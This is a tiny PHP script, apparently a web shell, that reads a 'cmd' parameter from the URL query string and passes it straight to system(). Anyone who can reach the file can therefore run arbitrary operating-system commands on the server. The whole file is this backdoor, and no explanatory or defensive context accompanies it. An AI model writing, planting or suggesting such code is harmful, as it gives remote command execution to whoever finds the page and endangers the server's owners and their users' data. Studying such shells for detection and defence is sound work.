<?php
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    $test = $_GET['cmd'];
    system($test);  // Directly output result without echoing it again
} else {
    echo "No command provided.";
}
?>
